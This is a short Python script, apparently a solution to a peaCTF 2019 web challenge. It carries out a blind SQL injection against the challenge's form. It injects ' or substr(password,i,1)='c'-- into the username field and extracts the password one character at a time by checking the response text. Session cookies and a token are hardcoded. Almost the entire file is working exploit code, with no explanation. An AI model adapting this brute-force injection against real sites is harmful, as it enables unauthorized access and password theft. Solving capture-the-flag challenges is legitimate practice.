import requests
import string

cookies = {
    '__cfduid': 'db581b6aff126143da1b6d690b3e287f41563976384',
    'token': '50bb05991c9f48d695b078e34573959f',
    'flask': '.eJwNykEKhTAMBcC7ZO2i3yY1z8uIsSmIWEXqSrz7dz3z0HT6tc_Va6OxXbd31I7NK40kwSwI8FtQWHOCWBjUI8sQISjU0b3mLyYsbMVC_wmXZPA5wbL2CjWOSu8fVWodaw.XThmlQ.r8gpErp8ezjmktJ7yGGoTU5v0CE',
}

headers = {
    'Origin': 'http://shell1.2019.peactf.com:43111',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Referer': 'http://shell1.2019.peactf.com:43111/reset.html',
}

str = ""

for i in range(1,9):
    for j in string.printable:
        data = "username=' or substr(password,{},1)='{}'--&answer=123&debug=0".format(i,j)
        print(data)
        response = requests.post('http://shell1.2019.peactf.com:43111/result.php', headers=headers, cookies=cookies, data=data, verify=False)
        if "Your answer" in response.text:
            str += j
            print(j)
            break

print(str)